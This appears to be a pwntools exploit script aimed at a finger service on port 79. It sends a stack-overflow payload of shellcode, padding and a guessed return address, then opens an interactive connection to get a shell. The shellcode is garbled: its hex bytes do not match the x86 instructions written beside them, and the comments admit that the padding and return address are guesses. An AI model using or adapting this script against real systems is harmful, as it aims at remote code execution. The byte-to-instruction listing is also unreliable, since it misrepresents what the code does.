from pwn import *

shellcode = (
    "\xdd\x00" +     # pushl  $0
    "\xdd\x01" +     # pushl  $1
    "\xdd\x02" +     # pushl  $2
    "\xdd\x03" +     # pushl  $3
    "\xd0\x5e\x5c" + # movl   (%esi),%eax
    "\xbc\x8f\x61\x00" + # movl   $0x61,%edi
    "\xd0\x50\x5a" + # movl   (%eax),%edx
    "\xdd\x00" +     # pushl  $0
    "\xdd\x00" +     # pushl  $0
    "\xdd\x8f\x00\x00\x00\x00" + # movl   0x0(%edi),%eax
    "\xdd\x8f\x02\x00\x00\x00" + # movl   0x2(%edi),%eax
    "\xd0\x5e\x5b" + # movl   (%esi),%ebx
    "\xdd\x10" +     # movl   (%eax),%edx
    "\xdd\x5b" +     # popl   %ebx
    "\xdd\x5a" +     # popl   %edx
    "\xdd\x03" +     # pushl  $3
    "\xd0\x5e\x5c" + # movl   (%esi),%eax
    "\xbc\x8f\x62\x00" + # movl   $0x62,%edi
    "\xd0\x00\x5b" + # movl   (%eax),%ebx
    "\xdd\x5b" +     # popl   %ebx
    "\xdd\x5a" +     # popl   %edx
    "\xdd\x02" +     # pushl  $2
    "\xd0\x5e\x5c" + # movl   (%esi),%eax
    "\xbc\x8f\x5a\x00" + # movl   $0x5a,%edi
    "\xf3\x02\x5b\xef" + # int    $0xef
    "\xdd\x8f\x2f\x73\x68\x00" + # movl   $0x68732f,%edi
    "\xdd\x8f\x2f\x62\x69\x6e" + # movl   $0x6e69622f,%edi
    "\xd0\x5e\x5b" + # movl   (%esi),%ebx
    "\xdd\x00" +     # pushl  $0
    "\xdd\x00" +     # pushl  $0
    "\xdd\x5b" +     # popl   %ebx
    "\xdd\x03" +     # pushl  $3
    "\xd0\x5e\x5c" + # movl   (%esi),%eax
    "\xbc\x3b"       # movl   $0x3b,%edi
).encode('latin1')  # Convert string to bytes using latin1 encoding

payload = shellcode + b'a' * 0x10       # add a few padding (idk y but it is needed!)
payload = payload.rjust(512, b'\x01')   # add nop padding
payload += b"\0" * 0x10                 # zero out
payload += b"\x38\xea\xff\x7f"          # return address (a guess)

target_ip = '127.0.0.1'
target_port = 79
conn = remote(target_ip, target_port)
conn.send(payload)
conn.interactive()